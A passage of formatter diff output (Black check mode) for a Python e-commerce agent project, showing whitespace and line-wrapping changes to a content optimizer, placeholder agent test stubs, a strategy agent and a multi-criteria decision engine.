-                "strategy": "keyword_optimization",
-                "reason": f"SEO score ({seo_score}) below threshold ({self.performance_thresholds['seo_score']})",
-                "priority": 1,
-            })
+            priorities.append(
+                {
+                    "strategy": "keyword_optimization",
+                    "reason": f"SEO score ({seo_score}) below threshold ({self.performance_thresholds['seo_score']})",
+                    "priority": 1,
+                }
+            )
 
         # Check conversion rate
         conversion_rate = performance_data.get("conversion_rate", 0)
         if conversion_rate < 0.02:  # 2% threshold
-            priorities.append({
-                "strategy": "conversion_optimization",
-                "reason": f"Conversion rate ({conversion_rate:.3f}) below 2%",
-                "priority": 2,
-            })
+            priorities.append(
+                {
+                    "strategy": "conversion_optimization",
+                    "reason": f"Conversion rate ({conversion_rate:.3f}) below 2%",
+                    "priority": 2,
+                }
+            )
 
         # Check readability
         readability_score = performance_data.get("readability_score", 0)
         if readability_score < self.performance_thresholds["readability_score"]:
-            priorities.append({
-                "strategy": "readability_optimization",
-                "reason": f"Readability score ({readability_score}) below threshold",
-                "priority": 3,
-            })
+            priorities.append(
+                {
+                    "strategy": "readability_optimization",
+                    "reason": f"Readability score ({readability_score}) below threshold",
+                    "priority": 3,
+                }
+            )
 
         return sorted(priorities, key=lambda x: x["priority"])
 
-    async def _create_conservative_variant(self, content: Dict[str, Any]) -> Dict[str, Any]:
+    async def _create_conservative_variant(
+        self, content: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Create a conservative optimization variant."""
         variant_content = content.copy()
 
         # Minor keyword enhancements
         if "title" in content:
@@ -616,20 +692,26 @@
             "content": variant_content,
             "variant_type": "conservative",
             "changes": ["Added premium positioning to title"],
         }
 
-    async def _create_aggressive_variant(self, content: Dict[str, Any]) -> Dict[str, Any]:
+    async def _create_aggressive_variant(
+        self, content: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Create an aggressive optimization variant."""
         variant_content = content.copy()
 
         # Aggressive keyword optimization
         if "title" in content:
-            variant_content["title"] = f"PREMIUM {content['title']} - BEST QUALITY GUARANTEED!"
+            variant_content["title"] = (
+                f"PREMIUM {content['title']} - BEST QUALITY GUARANTEED!"
+            )
 
         if "description" in content:
-            variant_content["description"] = content["description"] + " LIMITED TIME OFFER! BUY NOW!"
+            variant_content["description"] = (
+                content["description"] + " LIMITED TIME OFFER! BUY NOW!"
+            )
 
         return {
             "content": variant_content,
             "variant_type": "aggressive",
             "changes": ["Aggressive keyword optimization", "Strong call-to-action"],
@@ -639,23 +721,29 @@
         """Create a balanced optimization variant."""
         variant_content = content.copy()
 
         # Balanced optimization
         if "title" in content:
-            variant_content["title"] = f"Premium {content['title']} | Professional Grade"
+            variant_content["title"] = (
+                f"Premium {content['title']} | Professional Grade"
+            )
 
         if "description" in content:
-            variant_content["description"] = content["description"] + " Backed by satisfaction guarantee."
+            variant_content["description"] = (
+                content["description"] + " Backed by satisfaction guarantee."
+            )
 
         return {
             "content": variant_content,
             "variant_type": "balanced",
             "changes": ["Balanced keyword enhancement", "Trust signal addition"],
         }
 
     # Missing helper methods
-    async def _predict_variant_performance(self, content: Dict[str, Any]) -> Dict[str, Any]:
+    async def _predict_variant_performance(
+        self, content: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Predict variant performance."""
         # Simplified performance prediction
         title_score = len(content.get("title", "")) * 0.5
         desc_score = len(content.get("description", "")) * 0.1
 
@@ -666,16 +754,23 @@
             "predicted_ctr": predicted_ctr,
             "predicted_conversion_rate": predicted_conversion,
             "confidence": 0.7,
         }
 
-    async def _predict_performance_improvement(self, original: Dict[str, Any], optimized: Dict[str, Any], performance_data: Dict[str, Any]) -> Dict[str, Any]:
+    async def _predict_performance_improvement(
+        self,
+        original: Dict[str, Any],
+        optimized: Dict[str, Any],
+        performance_data: Dict[str, Any],
+    ) -> Dict[str, Any]:
         """Predict performance improvement."""
         original_score = await self._calculate_overall_content_score(original)
         optimized_score = await self._calculate_overall_content_score(optimized)
 
-        improvement_factor = optimized_score / original_score if original_score > 0 else 1.1
+        improvement_factor = (
+            optimized_score / original_score if original_score > 0 else 1.1
+        )
 
         current_ctr = performance_data.get("click_through_rate", 0.1)
         current_conversion = performance_data.get("conversion_rate", 0.02)
 
         return {
@@ -683,11 +778,13 @@
             "predicted_conversion_improvement": current_conversion * improvement_factor,
             "improvement_factor": improvement_factor,
             "confidence": 0.75,
         }
 
-    async def _calculate_goal_achievement(self, original: Dict[str, Any], optimized: Dict[str, Any], goals: List[str]) -> Dict[str, float]:
+    async def _calculate_goal_achievement(
+        self, original: Dict[str, Any], optimized: Dict[str, Any], goals: List[str]
+    ) -> Dict[str, float]:
         """Calculate goal achievement scores."""
         scores = {}
 
         for goal in goals:
             if goal == "seo":
@@ -713,11 +810,13 @@
             if "premium" not in title.lower():
                 optimized_content["title"] = f"Premium {title}"
 
         return {"optimized_content": optimized_content, "success": True}
 
-    async def _optimize_for_conversion_rate(self, content: Dict[str, Any]) -> Dict[str, Any]:
+    async def _optimize_for_conversion_rate(
+        self, content: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Optimize content for conversion rate."""
         optimized_content = content.copy()
 
         # Add urgency to description
         if "description" in content:
@@ -725,11 +824,13 @@
             if "limited time" not in description.lower():
                 optimized_content["description"] = description + " Limited time offer!"
 
         return {"optimized_content": optimized_content, "success": True}
 
-    async def _optimize_for_readability(self, content: Dict[str, Any]) -> Dict[str, Any]:
+    async def _optimize_for_readability(
+        self, content: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Optimize content for readability."""
         optimized_content = content.copy()
 
         # Simplify description
         if "description" in content:
@@ -762,30 +863,34 @@
         """Enhance description with keywords."""
         if "professional" not in description.lower():
             return f"{description} Professional grade quality."
         return description
 
-    async def _optimize_bullet_points_structure(self, bullet_points: List[str]) -> List[str]:
+    async def _optimize_bullet_points_structure(
+        self, bullet_points: List[str]
+    ) -> List[str]:
         """Optimize bullet points structure."""
         if not bullet_points:
             return ["Premium quality", "Professional grade", "Satisfaction guaranteed"]
 
         # Ensure each bullet point starts with a strong word
         optimized = []
         for bullet in bullet_points:
-            if not bullet.startswith(("Premium", "Professional", "Advanced", "Superior")):
+            if not bullet.startswith(
+                ("Premium", "Professional", "Advanced", "Superior")
+            ):
                 optimized.append(f"Premium {bullet}")
             else:
                 optimized.append(bullet)
         return optimized
 
     async def _generate_meta_description(self, description: str) -> str:
         """Generate meta description from description."""
         # Take first 150 characters and ensure it ends properly
         meta_desc = description[:150]
         if len(description) > 150:
-            meta_desc = meta_desc.rsplit(' ', 1)[0] + "..."
+            meta_desc = meta_desc.rsplit(" ", 1)[0] + "..."
         return meta_desc
 
     async def _improve_readability(self, text: str) -> str:
         """Improve text readability."""
         # Simple readability improvements
@@ -793,11 +898,17 @@
         improved = improved.replace(", and ", ", and\n")  # Break long lists
         return improved
 
     def _has_call_to_action(self, text: str) -> bool:
         """Check if text has call-to-action."""
-        cta_phrases = ["buy now", "order today", "shop now", "get yours", "limited time"]
+        cta_phrases = [
+            "buy now",
+            "order today",
+            "shop now",
+            "get yours",
+            "limited time",
+        ]
         return any(phrase in text.lower() for phrase in cta_phrases)
 
     async def _enhance_value_proposition(self, bullet_points: List[str]) -> List[str]:
         """Enhance value proposition in bullet points."""
         enhanced = []
@@ -810,12 +921,12 @@
 
     async def _enhance_text_quality(self, text: str) -> str:
         """Enhance text quality."""
         # Simple quality enhancements
         enhanced = text.strip()
-        if not enhanced.endswith('.'):
-            enhanced += '.'
+        if not enhanced.endswith("."):
+            enhanced += "."
 
         # Capitalize first letter
         if enhanced and enhanced[0].islower():
             enhanced = enhanced[0].upper() + enhanced[1:]
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/content/content_optimizer.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/test_orchestrator.py	2025-06-14 20:35:30.763679+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/test_orchestrator.py	2025-06-19 04:03:38.468377+00:00
@@ -1,11 +1,11 @@
 """
 Agent Test module for executive_orchestrator
 
 This module contains agent-focused tests for the migrated executive_orchestrator component.
 Tier: 2
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from orchestrator import *
+
 
 class TestOrchestratorAgent:
     """Agent test class for orchestrator."""
 
     def test_import(self):
@@ -50,15 +51,16 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for agents
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/test_orchestrator.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/test_memory_manager.py	2025-06-14 20:35:30.763679+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/test_memory_manager.py	2025-06-19 04:03:38.510987+00:00
@@ -1,11 +1,11 @@
 """
 Agent Test module for executive_memory_manager
 
 This module contains agent-focused tests for the migrated executive_memory_manager component.
 Tier: 2
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from memory_manager import *
+
 
 class TestMemoryManagerAgent:
     """Agent test class for memory_manager."""
 
     def test_import(self):
@@ -50,15 +51,16 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for agents
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/test_memory_manager.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/strategy_agent.py	2025-06-14 20:35:30.763679+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/strategy_agent.py	2025-06-19 04:03:38.581919+00:00
@@ -48,28 +48,28 @@
 
 
 class StrategyAgent(BaseAgent):
     """
     Strategy Agent for executive decision making.
-    
+
     Provides strategic planning, coordination, and optimization capabilities
     for the FlipSync agent ecosystem.
     """
 
     def __init__(self, agent_id: str, config: Optional[Dict[str, Any]] = None):
         """
         Initialize the Strategy Agent.
-        
+
         Args:
             agent_id: Unique identifier for this agent instance
             config: Optional configuration dictionary
         """
         super().__init__(agent_id=agent_id, config=config or {})
         self.strategies: Dict[str, Strategy] = {}
         self.active_strategies: Set[str] = set()
         self.performance_history: List[Dict[str, Any]] = []
-        
+
         logger.info(f"StrategyAgent {agent_id} initialized")
 
     async def create_strategy(
         self,
         name: str,
@@ -78,38 +78,38 @@
         parameters: Optional[Dict[str, Any]] = None,
         tags: Optional[Set[str]] = None,
     ) -> Strategy:
         """
         Create a new strategy.
-        
+
         Args:
             name: Strategy name
             description: Strategy description
             rules: Strategy rules and conditions
             parameters: Optional strategy parameters
             tags: Optional strategy tags
-            
+
         Returns:
             Created strategy instance
         """
         strategy = Strategy(
             name=name,
             description=description,
             rules=rules,
             parameters=parameters or {},
             tags=tags or set(),
         )
-        
+
         self.strategies[str(strategy.strategy_id)] = strategy
         logger.info(f"Created strategy: {name} ({strategy.strategy_id})")
-        
+
         return strategy
 
     def get_status(self) -> Dict[str, Any]:
         """
         Get agent status.
-        
+
         Returns:
             Agent status information
         """
         return {
             "agent_id": self.agent_id,
@@ -121,47 +121,47 @@
         }
 
     async def process_message(self, message: Dict[str, Any]) -> None:
         """
         Process incoming message.
-        
+
         Args:
             message: Message to process
         """
         message_type = message.get("type", "unknown")
-        
+
         if message_type == "create_strategy":
             await self.create_strategy(
                 name=message.get("name", ""),
                 description=message.get("description", ""),
                 rules=message.get("rules", {}),
                 parameters=message.get("parameters"),
                 tags=message.get("tags"),
             )
-            
+
         elif message_type == "get_status":
             self.get_status()
-            
+
         else:
             logger.warning(f"Unknown message type: {message_type}")
 
     async def take_action(self, action: Dict[str, Any]) -> None:
         """
         Take a specific action.
-        
+
         Args:
             action: Action dictionary containing action type and parameters
         """
         action_type = action.get("type", "unknown")
         params = action.get("parameters", {})
-        
+
         if action_type == "create_strategy":
             await self.create_strategy(
                 name=params.get("name", ""),
                 description=params.get("description", ""),
                 rules=params.get("rules", {}),
                 parameters=params.get("parameters"),
                 tags=params.get("tags"),
             )
-            
+
         else:
             logger.warning(f"Unknown action type: {action_type}")
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/strategy_agent.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/logistics/test_shipping_agent.py	2025-06-14 20:35:30.763679+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/logistics/test_shipping_agent.py	2025-06-19 04:03:39.000775+00:00
@@ -1,11 +1,11 @@
 """
 Agent Test module for logistics_shipping_agent
 
 This module contains agent-focused tests for the migrated logistics_shipping_agent component.
 Tier: 2
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from shipping_agent import *
+
 
 class TestShippingAgentAgent:
     """Agent test class for shipping_agent."""
 
     def test_import(self):
@@ -50,15 +51,16 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for agents
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/logistics/test_shipping_agent.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/decision_engine.py	2025-06-14 20:35:30.763679+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/decision_engine.py	2025-06-19 04:03:39.032863+00:00
@@ -4,13 +4,21 @@
 import logging
 import statistics
 from decimal import Decimal
 
 from fs_agt_clean.core.models.business_models import (
-    ExecutiveDecision, DecisionCriteria, DecisionAlternative, DecisionType,
-    RiskLevel, Priority, BusinessObjective, FinancialMetrics, RiskFactor,
-    calculate_weighted_score, assess_risk_level
+    ExecutiveDecision,
+    DecisionCriteria,
+    DecisionAlternative,
+    DecisionType,
+    RiskLevel,
+    Priority,
+    BusinessObjective,
+    FinancialMetrics,
+    RiskFactor,
+    calculate_weighted_score,
+    assess_risk_level,
 )
 
 logger = logging.getLogger(__name__)
 
 "\nDecision engine module for the FlipSync Agentic System.\nHandles decision-making processes and strategy application.\n"
@@ -28,10 +36,11 @@
 
 
 @dataclass
 class DecisionContext:
     """Context information for decision making."""
+
     business_objectives: List[BusinessObjective]
     available_budget: Decimal
     time_constraints: str
     risk_tolerance: RiskLevel
     strategic_priorities: List[str]
@@ -41,10 +50,11 @@
 
 
 @dataclass
 class DecisionRecommendation:
     """Decision recommendation with detailed analysis."""
+
     recommended_alternative: DecisionAlternative
     confidence_score: float
     reasoning: str
     risk_assessment: List[RiskFactor]
     implementation_steps: List[str]
@@ -229,67 +239,67 @@
                 weight=0.25,
                 description="Expected financial return (ROI)",
                 measurement_type="quantitative",
                 scale_min=0.0,
                 scale_max=100.0,
-                higher_is_better=True
+                higher_is_better=True,
             ),
             "risk_level": DecisionCriteria(
                 criteria_name="risk_level",
                 weight=0.20,
                 description="Overall risk assessment",
                 measurement_type="qualitative",
                 scale_min=1.0,
                 scale_max=5.0,
-                higher_is_better=False  # Lower risk is better
+                higher_is_better=False,  # Lower risk is better
             ),
             "strategic_alignment": DecisionCriteria(
                 criteria_name="strategic_alignment",
                 weight=0.20,
                 description="Alignment with business strategy",
                 measurement_type="qualitative",
                 scale_min=1.0,
                 scale_max=10.0,
-                higher_is_better=True
+                higher_is_better=True,
             ),
             "implementation_complexity": DecisionCriteria(
                 criteria_name="implementation_complexity",
                 weight=0.15,
                 description="Complexity of implementation",
                 measurement_type="qualitative",
                 scale_min=1.0,
                 scale_max=5.0,
-                higher_is_better=False  # Lower complexity is better
+                higher_is_better=False,  # Lower complexity is better
             ),
             "time_to_value": DecisionCriteria(
                 criteria_name="time_to_value",
                 weight=0.10,
                 description="Time to realize value",
                 measurement_type="quantitative",
                 scale_min=1.0,
                 scale_max=24.0,  # months
-                higher_is_better=False  # Faster is better
+                higher_is_better=False,  # Faster is better
             ),
             "resource_requirements": DecisionCriteria(
                 criteria_name="resource_requirements",
                 weight=0.10,
                 description="Required resources",
                 measurement_type="quantitative",
                 scale_min=1.0,
                 scale_max=10.0,
-                higher_is_better=False  # Lower requirements are better
-            )
+                higher_is_better=False,  # Lower requirements are better
+            ),
         }
 
         logger.info("Multi-criteria decision engine initialized")
 
     async def analyze_decision(
         self,
         decision_type: DecisionType,
         alternatives: List[DecisionAlternative],
         context: DecisionContext,
-        custom_criteria: List[DecisionCriteria] = None
+        custom_criteria: List[DecisionCriteria] = None,
     ) -> DecisionRecommendation:
         """
         Analyze a decision using multi-criteria analysis.
 
         Args:
@@ -301,68 +311,89 @@
         Returns:
             DecisionRecommendation with analysis and recommendation
         """
         try:
             # Use custom criteria or adapt standard criteria based on decision type
-            criteria = custom_criteria or self._get_criteria_for_decision_type(decision_type, context)
+            criteria = custom_criteria or self._get_criteria_for_decision_type(
+                decision_type, context
+            )
 
             # Score all alternatives against criteria
-            scored_alternatives = await self._score_alternatives(alternatives, criteria, context)
+            scored_alternatives = await self._score_alternatives(
+                alternatives, criteria, context
+            )
 
             # Select best alternative
             best_alternative = self._select_best_alternative(scored_alternatives)
 
             # Calculate confidence score
-            confidence_score = self._calculate_confidence_score(scored_alternatives, context)
+            confidence_score = self._calculate_confidence_score(
+                scored_alternatives, context
+            )
 
             # Generate reasoning
-            reasoning = self._generate_reasoning(best_alternative, scored_alternatives, criteria)
+            reasoning = self._generate_reasoning(
+                best_alternative, scored_alternatives, criteria
+            )
 
             # Assess risks
-            risk_assessment = await self._assess_decision_risks(best_alternative, context)
+            risk_assessment = await self._assess_decision_risks(
+                best_alternative, context
+            )
 
             # Generate implementation steps
-            implementation_steps = self._generate_implementation_steps(best_alternative, decision_type)
+            implementation_steps = self._generate_implementation_steps(
+                best_alternative, decision_type
+            )
 
             # Calculate success probability
-            success_probability = self._calculate_success_probability(best_alternative, context)
+            success_probability = self._calculate_success_probability(
+                best_alternative, context
+            )
 
             # Define expected outcomes
-            expected_outcomes = self._define_expected_outcomes(best_alternative, context)
+            expected_outcomes = self._define_expected_outcomes(
+                best_alternative, context
+            )
 
             # Define monitoring metrics
-            monitoring_metrics = self._define_monitoring_metrics(best_alternative, decision_type)
+            monitoring_metrics = self._define_monitoring_metrics(
+                best_alternative, decision_type
+            )
 
             return DecisionRecommendation(
                 recommended_alternative=best_alternative,
                 confidence_score=confidence_score,
                 reasoning=reasoning,
                 risk_assessment=risk_assessment,
                 implementation_steps=implementation_steps,
                 success_probability=success_probability,
                 expected_outcomes=expected_outcomes,
-                monitoring_metrics=monitoring_metrics
+                monitoring_metrics=monitoring_metrics,
             )
 
         except Exception as e:
             logger.error(f"Error in decision analysis: {e}")
             # Return safe recommendation
             return DecisionRecommendation(
-                recommended_alternative=alternatives[0] if alternatives else DecisionAlternative(),
+                recommended_alternative=(
+                    alternatives[0] if alternatives else DecisionAlternative()
+                ),
                 confidence_score=0.1,
                 reasoning=f"Error in analysis: {e}. Recommend further review.",
                 risk_assessment=[],
-                implementation_steps=["Conduct detailed analysis", "Seek expert consultation"],
+                implementation_steps=[
+                    "Conduct detailed analysis",
+                    "Seek expert consultation",
+                ],
                 success_probability=0.5,
                 expected_outcomes={"status": "requires_review"},
-                monitoring_metrics=["decision_outcome", "implementation_progress"]
+                monitoring_metrics=["decision_outcome", "implementation_progress"],
             )
 
     def _get_criteria_for_decision_type(
-        self,
-        decision_type: DecisionType,
-        context: DecisionContext
+        self, decision_type: DecisionType, context: DecisionContext
     ) -> List[DecisionCriteria]:
         """Get appropriate criteria based on decision type."""
         base_criteria = list(self.standard_criteria.values())
 
         # Adjust weights based on decision type
@@ -395,21 +426,23 @@
 
     async def _score_alternatives(
         self,
         alternatives: List[DecisionAlternative],
         criteria: List[DecisionCriteria],
-        context: DecisionContext
+        context: DecisionContext,
     ) -> List[DecisionAlternative]:
         """Score all alternatives against criteria."""
         scored_alternatives = []
 
         for alternative in alternatives:
             # Calculate scores for missing criteria
             enhanced_scores = alternative.scores.copy()
 
             # Auto-score based on available data
-            enhanced_scores = await self._auto_score_alternative(alternative, criteria, context, enhanced_scores)
+            enhanced_scores = await self._auto_score_alternative(
+                alternative, criteria, context, enhanced_scores
+            )
 
             # Calculate weighted score
             weighted_score = calculate_weighted_score(enhanced_scores, criteria)
 
             # Create enhanced alternative
@@ -422,11 +455,11 @@
                 pros=alternative.pros,
                 cons=alternative.cons,
                 implementation_complexity=alternative.implementation_complexity,
                 resource_requirements=alternative.resource_requirements,
                 timeline=alternative.timeline,
-                risks=alternative.risks
+                risks=alternative.risks,
             )
 
             scored_alternatives.append(enhanced_alternative)
 
         return scored_alternatives
@@ -434,11 +467,11 @@
     async def _auto_score_alternative(
         self,
         alternative: DecisionAlternative,
         criteria: List[DecisionCriteria],
         context: DecisionContext,
-        existing_scores: Dict[str, float]
+        existing_scores: Dict[str, float],
     ) -> Dict[str, float]:
         """Automatically score alternative based on available data."""
         scores = existing_scores.copy()
 
         # Score implementation complexity
@@ -453,13 +486,22 @@
             risk_score = min(1.0 + len(alternative.risks) * 0.5, 5.0)
             scores["risk_level"] = risk_score
 
         # Score strategic alignment based on description keywords
         if "strategic_alignment" not in scores:
-            strategic_keywords = ["growth", "efficiency", "innovation", "competitive", "market"]
-            keyword_count = sum(1 for keyword in strategic_keywords
-                              if keyword in alternative.description.lower())
+            strategic_keywords = [
+                "growth",
+                "efficiency",
+                "innovation",
+                "competitive",
+                "market",
+            ]
+            keyword_count = sum(
+                1
+                for keyword in strategic_keywords
+                if keyword in alternative.description.lower()
+            )
             scores["strategic_alignment"] = min(5.0 + keyword_count, 10.0)
 
         # Score time to value based on timeline
         if "time_to_value" not in scores and alternative.timeline:
             # Extract months from timeline string
@@ -479,37 +521,40 @@
         timeline_lower = timeline.lower()
 
         if "week" in timeline_lower:
             # Extract weeks and convert to months
             import re
-            weeks = re.findall(r'\d+', timeline_lower)
+
+            weeks = re.findall(r"\d+", timeline_lower)
             if weeks:
                 return float(weeks[0]) / 4.0
         elif "month" in timeline_lower:
             import re
-            months = re.findall(r'\d+', timeline_lower)
+
+            months = re.findall(r"\d+", timeline_lower)
             if months:
                 return float(months[0])
         elif "year" in timeline_lower:
             import re
-            years = re.findall(r'\d+', timeline_lower)
+
+            years = re.findall(r"\d+", timeline_lower)
             if years:
                 return float(years[0]) * 12.0
 
         return 6.0  # Default to 6 months
 
-    def _select_best_alternative(self, alternatives: List[DecisionAlternative]) -> DecisionAlternative:
+    def _select_best_alternative(
+        self, alternatives: List[DecisionAlternative]
+    ) -> DecisionAlternative:
         """Select the best alternative based on weighted scores."""
         if not alternatives:
             return DecisionAlternative()
 
         return max(alternatives, key=lambda alt: alt.weighted_score)
 
     def _calculate_confidence_score(
-        self,
-        alternatives: List[DecisionAlternative],
-        context: DecisionContext
+        self, alternatives: List[DecisionAlternative], context: DecisionContext
     ) -> float:
         """Calculate confidence score for the recommendation."""
         if len(alternatives) < 2:
             return 0.5  # Low confidence with only one option
 
@@ -526,25 +571,29 @@
 
         # Adjust based on data quality
         data_quality_bonus = 0.1 if len(alternatives) >= 3 else 0.0
 
         # Adjust based on risk tolerance alignment
-        risk_alignment_bonus = 0.1 if context.risk_tolerance in [RiskLevel.LOW, RiskLevel.MEDIUM] else 0.0
+        risk_alignment_bonus = (
+            0.1 if context.risk_tolerance in [RiskLevel.LOW, RiskLevel.MEDIUM] else 0.0
+        )
 
         return min(base_confidence + data_quality_bonus + risk_alignment_bonus, 1.0)
 
     def _generate_reasoning(
         self,
         best_alternative: DecisionAlternative,
         all_alternatives: List[DecisionAlternative],
-        criteria: List[DecisionCriteria]
+        criteria: List[DecisionCriteria],
     ) -> str:
         """Generate human-readable reasoning for the recommendation."""
         reasoning_parts = []
 
         # Overall recommendation
-        reasoning_parts.append(f"Recommending '{best_alternative.name}' based on multi-criteria analysis.")
+        reasoning_parts.append(
+            f"Recommending '{best_alternative.name}' based on multi-criteria analysis."
+        )
 
         # Score comparison
         if len(all_alternatives) > 1:
             scores = [alt.weighted_score for alt in all_alternatives]
             avg_score = statistics.mean(scores)
@@ -565,18 +614,18 @@
         if strengths:
             reasoning_parts.append(f"Key strengths include {', '.join(strengths)}.")
 
         # Risk considerations
         if best_alternative.risks:
-            reasoning_parts.append(f"Consider {len(best_alternative.risks)} identified risks during implementation.")
+            reasoning_parts.append(
+                f"Consider {len(best_alternative.risks)} identified risks during implementation."
+            )
 
         return " ".join(reasoning_parts)
 
     async def _assess_decision_risks(
-        self,
-        alternative: DecisionAlternative,
-        context: DecisionContext
+        self, alternative: DecisionAlternative, context: DecisionContext
     ) -> List[RiskFactor]:
         """Assess risks for the recommended decision."""
         risks = []
 
         # Convert string risks to RiskFactor objects
@@ -586,76 +635,85 @@
                 name=f"Risk {i+1}",
                 description=risk_desc,
                 probability=0.3,  # Default probability
                 impact=0.5,  # Default impact
                 risk_level=assess_risk_level(0.3, 0.5),
-                mitigation_strategies=[f"Monitor and mitigate {risk_desc.lower()}"]
+                mitigation_strategies=[f"Monitor and mitigate {risk_desc.lower()}"],
             )
             risks.append(risk_factor)
 
         return risks
 
     def _generate_implementation_steps(
-        self,
-        alternative: DecisionAlternative,
-        decision_type: DecisionType
+        self, alternative: DecisionAlternative, decision_type: DecisionType
     ) -> List[str]:
         """Generate implementation steps for the recommended alternative."""
         steps = [
             "Secure stakeholder approval and buy-in",
             "Allocate required resources and budget",
-            "Develop detailed implementation plan"
+            "Develop detailed implementation plan",
         ]
 
         # Add decision-type specific steps
         if decision_type == DecisionType.INVESTMENT:
-            steps.extend([
-                "Conduct final due diligence",
-                "Execute investment agreements",
-                "Establish monitoring and reporting framework"
-            ])
+            steps.extend(
+                [
+                    "Conduct final due diligence",
+                    "Execute investment agreements",
+                    "Establish monitoring and reporting framework",
+                ]
+            )
         elif decision_type == DecisionType.STRATEGIC_PLANNING:
-            steps.extend([
-                "Communicate strategy to organization",
-                "Align departmental plans with strategy",
-                "Establish KPIs and measurement systems"
-            ])
+            steps.extend(
+                [
+                    "Communicate strategy to organization",
+                    "Align departmental plans with strategy",
+                    "Establish KPIs and measurement systems",
+                ]
+            )
 
         steps.append("Monitor progress and adjust as needed")
 
         return steps
 
     def _calculate_success_probability(
-        self,
-        alternative: DecisionAlternative,
-        context: DecisionContext
+        self, alternative: DecisionAlternative, context: DecisionContext
     ) -> float:
         """Calculate probability of successful implementation."""
         base_probability = 0.7
 
         # Adjust based on complexity
         complexity_map = {"low": 0.1, "medium": 0.0, "high": -0.1, "very_high": -0.2}
-        complexity_adjustment = complexity_map.get(alternative.implementation_complexity, 0.0)
+        complexity_adjustment = complexity_map.get(
+            alternative.implementation_complexity, 0.0
+        )
 
         # Adjust based on risk count
         risk_adjustment = -len(alternative.risks) * 0.05
 
         # Adjust based on weighted score
         score_adjustment = (alternative.weighted_score - 0.5) * 0.2
 
-        return max(0.1, min(0.95, base_probability + complexity_adjustment + risk_adjustment + score_adjustment))
+        return max(
+            0.1,
+            min(
+                0.95,
+                base_probability
+                + complexity_adjustment
+                + risk_adjustment
+                + score_adjustment,
+            ),
+        )
 
     def _define_expected_outcomes(
-        self,
-        alternative: DecisionAlternative,
-        context: DecisionContext
+        self, alternative: DecisionAlternative, context: DecisionContext
     ) -> Dict[str, Any]:
         """Define expected outcomes from implementing the alternative."""
         outcomes = {
             "implementation_timeline": alternative.timeline or "6-12 months",
             "resource_utilization": "As planned",
-            "risk_mitigation": "Managed within acceptable levels"
+            "risk_mitigation": "Managed within acceptable levels",
         }
 
         # Add financial outcomes if available
         if "financial_return" in alternative.scores:
             outcomes["expected_roi"] = f"{alternative.scores['financial_return']:.1f}%"
@@ -664,38 +722,42 @@
         if "strategic_alignment" in alternative.scores:
             alignment_score = alternative.scores["strategic_alignment"]
             if alignment_score >= 8.0:
                 outcomes["strategic_impact"] = "High alignment with business objectives"
             elif alignment_score >= 6.0:
-                outcomes["strategic_impact"] = "Moderate alignment with business objectives"
+                outcomes["strategic_impact"] = (
+                    "Moderate alignment with business objectives"
+                )
             else:
                 outcomes["strategic_impact"] = "Limited strategic alignment"
 
         return outcomes
 
     def _define_monitoring_metrics(
-        self,
-        alternative: DecisionAlternative,
-        decision_type: DecisionType
+        self, alternative: DecisionAlternative, decision_type: DecisionType
     ) -> List[str]:
         """Define metrics for monitoring implementation success."""
         base_metrics = [
             "Implementation progress (%)",
             "Budget utilization (%)",
-            "Timeline adherence"
+            "Timeline adherence",
         ]
 
         # Add decision-type specific metrics
         if decision_type == DecisionType.INVESTMENT:
-            base_metrics.extend([
-                "Return on investment (%)",
-                "Payback period (months)",
-                "Net present value"
-            ])
+            base_metrics.extend(
+                [
+                    "Return on investment (%)",
+                    "Payback period (months)",
+                    "Net present value",
+                ]
+            )
         elif decision_type == DecisionType.STRATEGIC_PLANNING:
-            base_metrics.extend([
-                "Strategic objective completion (%)",
-                "KPI achievement",
-                "Stakeholder satisfaction"
-            ])
+            base_metrics.extend(
+                [
+                    "Strategic objective completion (%)",
+                    "KPI achievement",
